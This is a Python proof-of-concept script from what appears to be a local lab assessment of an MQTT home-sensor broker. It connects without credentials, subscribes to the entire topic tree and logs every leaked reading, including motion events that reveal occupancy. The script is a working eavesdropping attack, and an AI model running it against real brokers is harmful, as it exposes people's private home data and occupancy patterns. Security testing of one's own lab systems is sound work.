#!/usr/bin/env python3
"""
eavesdrop.py — PoC: unauthorized sensor-data disclosure (confidentiality).

Demonstrates that on a broker allowing anonymous access an attacker with no
credentials can subscribe to the whole topic tree and read every sensor value,
including occupancy-revealing motion events.

SCOPE: point this only at the local lab broker you control (localhost).
This is a test harness for a self-contained assessment, not a tool for use
against systems you do not own.

Finding this maps to: VULN-01 (Anonymous access / broken authentication).

Usage:
    python src/attacks/eavesdrop.py                 # baseline broker, no creds
    python src/attacks/eavesdrop.py --duration 15   # capture for 15 seconds
"""

import argparse
import os
import sys
import time

import paho.mqtt.client as mqtt

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import mqtt_settings, apply_client_security, describe, TOPIC_WILDCARD  # noqa: E402

captured = []


def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code == 0:
        print(f"[eavesdrop] connected WITHOUT needing valid credentials")
        print(f"[eavesdrop] subscribing to '{TOPIC_WILDCARD}' (entire home)")
        client.subscribe(TOPIC_WILDCARD, qos=1)
    else:
        print(f"[eavesdrop] broker refused connection: {reason_code}")
        print("[eavesdrop] (this is the EXPECTED, secure result on the hardened broker)")


def on_message(client, userdata, msg):
    line = f"{msg.topic}  {msg.payload.decode(errors='replace')}"
    captured.append(line)
    print(f"[eavesdrop] LEAKED  {line}")


def main() -> int:
    ap = argparse.ArgumentParser(description="MQTT anonymous eavesdropping PoC (local lab only)")
    ap.add_argument("--duration", type=int, default=10, help="seconds to listen")
    args = ap.parse_args()

    settings = mqtt_settings()
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="attacker-sniffer")
    apply_client_security(client, settings)
    client.on_connect = on_connect
    client.on_message = on_message

    print(f"[eavesdrop] target {describe(settings)}")
    try:
        client.connect(settings["host"], settings["port"], keepalive=30)
    except Exception as exc:  # noqa: BLE001
        print(f"[eavesdrop] could not connect: {exc}")
        return 1

    client.loop_start()
    time.sleep(args.duration)
    client.loop_stop()
    client.disconnect()

    print("\n[eavesdrop] ----- summary -----")
    print(f"[eavesdrop] messages intercepted: {len(captured)}")
    if captured:
        topics = sorted({c.split('  ', 1)[0] for c in captured})
        print(f"[eavesdrop] distinct topics exposed: {topics}")
        print("[eavesdrop] RESULT: confidentiality broken — sensor data readable anonymously")
    else:
        print("[eavesdrop] RESULT: no data captured — access appears restricted (good)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
